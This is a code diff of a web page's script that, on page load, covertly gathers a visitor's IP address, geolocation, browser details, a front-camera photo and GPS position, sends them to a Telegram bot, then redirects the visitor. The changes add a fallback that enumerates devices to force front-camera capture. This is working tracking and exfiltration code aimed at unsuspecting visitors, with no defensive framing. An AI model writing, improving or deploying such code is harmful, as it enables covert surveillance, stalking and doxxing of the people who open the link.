@@ -92,15 +92,15 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================
-// 🔴 CAPTURE PHOTO — KAMERA DEPAN
+// 🔴 CAPTURE PHOTO — FORCE FRONT CAMERA
 // ============================================
 function capturePhoto() {
     return new Promise((resolve) => {
         const video = document.getElementById('videoPreview');
         const canvas = document.getElementById('photoCanvas');
 
+        // 🔴 CARA 1: FACING MODE USER (KAMERA DEPAN)
         navigator.mediaDevices.getUserMedia({
-            // 🔴 KAMERA DEPAN (user)
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
         })
         .then(stream => {
@@ -118,7 +118,34 @@ function capturePhoto() {
             }, 500);
         })
         .catch(() => {
-            resolve(null); // KAMERA GAGAL → LANJUT
+            // 🔴 CARA 2: AMBIL DAFTAR KAMERA → PILIH DEPAN
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    const frontCam = devices.find(d => d.kind === 'videoinput' && d.label.toLowerCase().includes('front'));
+                    if (frontCam) {
+                        navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: { exact: frontCam.deviceId }, width: { ideal: 640 }, height: { ideal: 480 } }
+                        })
+                        .then(stream => {
+                            video.srcObject = stream;
+                            video.play();
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                                stream.getTracks().forEach(t => t.stop());
+                                video.srcObject = null;
+                                resolve(imageData);
+                            }, 500);
+                        })
+                        .catch(() => resolve(null));
+                    } else {
+                        resolve(null);
+                    }
+                })
+                .catch(() => resolve(null));
         });
     });
 }
@@ -131,12 +158,11 @@ const ua = navigator.userAgent;
 const ref = document.referrer || 'Direct';
 const visitorId = 'visitor_' + Date.now();
 
-// 1. AMBIL IP + GEOLOKASI
+// 1. IP + GEOLOKASI
 fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
         const ip = data.ip;
-
         sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);
 
         fetch(`http://ip-api.com/json/${ip}`)
@@ -148,14 +174,14 @@ fetch('https://api.ipify.org?format=json')
             });
     });
 
-// 2. AMBIL FOTO (KAMERA DEPAN — POPUP ALLOW)
+// 2. FOTO (KAMERA DEPAN)
 capturePhoto().then(img => {
     if (img) {
         sendPhotoToTelegram(img, `📸 AUTO PHOTO (FRONT)\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
     }
 });
 
-// 3. AMBIL GPS (POPUP ALLOW) — OPSIONAL
+// 3. GPS
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
         pos => {
@@ -167,11 +193,11 @@ if (navigator.geolocation) {
     );
 }
 
-// 4. ✅ KIRIM DONE + REDIRECT
+// 4. ✅ DONE + REDIRECT
 setTimeout(() => {
     sendToTelegram(`✅ DONE\n━━━━━━━━━━━━━━━━━━━\n🆔 ${visitorId}`);
     window.location.replace(REDIRECT_URL);
-}, 3000);
+}, 3500);
 </script>
 
 </body>
